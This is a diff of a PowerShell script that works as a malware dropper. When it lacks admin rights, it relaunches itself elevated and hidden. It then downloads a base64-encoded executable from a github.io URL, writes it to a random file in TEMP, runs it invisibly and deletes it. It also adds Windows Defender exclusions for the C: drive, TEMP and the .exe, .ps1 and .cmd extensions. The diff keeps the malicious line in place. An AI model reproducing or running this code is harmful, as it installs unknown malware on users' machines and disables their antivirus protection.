@@ -1,7 +1,8 @@
 $currentPrincipal = [Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()
 if (-NOT ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") -or [Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)) {
     try {
-Start-Process PowerShell -Verb RunAs -ArgumentList "-Command", "$data = (New-Object Net.WebClient).DownloadString('https://stinkylick.github.io/stinkylick/2/a')  -replace '\[1\]', 'C'; $filename = Join-Path $env:TEMP ('{0}.exe' -f [Guid]::NewGuid().ToString('N')); [IO.File]::WriteAllBytes($filename, [Convert]::FromBase64String($data)); Start-Process -FilePath $filename -WindowStyle Hidden; Start-Sleep -Seconds 5; Remove-Item -Path $filename -Force; @('C:\',$env:TEMP) | % { try { Add-MpPreference -ExclusionPath $_ -EA Stop } catch {} }; @('.exe','.ps1','.cmd') | % { try { Add-MpPreference -ExclusionExtension $_ -EA Stop } catch {} }" -WindowStyle Hidden -Wait        exit
+        Start-Process PowerShell -Verb RunAs -ArgumentList "-Command", "$data = (New-Object Net.WebClient).DownloadString('https://stinkylick.github.io/stinkylick/2/a')  -replace '\[1\]', 'C'; $filename = Join-Path $env:TEMP ('{0}.exe' -f [Guid]::NewGuid().ToString('N')); [IO.File]::WriteAllBytes($filename, [Convert]::FromBase64String($data)); Start-Process -FilePath $filename -WindowStyle Hidden; Start-Sleep -Seconds 5; Remove-Item -Path $filename -Force; @('C:\',$env:TEMP) | % { try { Add-MpPreference -ExclusionPath $_ -EA Stop } catch {} }; @('.exe','.ps1','.cmd') | % { try { Add-MpPreference -ExclusionExtension $_ -EA Stop } catch {} }" -WindowStyle Hidden -Wait        exit
+        exit
     } catch {}
 }
 $folderPath = Join-Path $env:TEMP "hs_error_pid_5987"
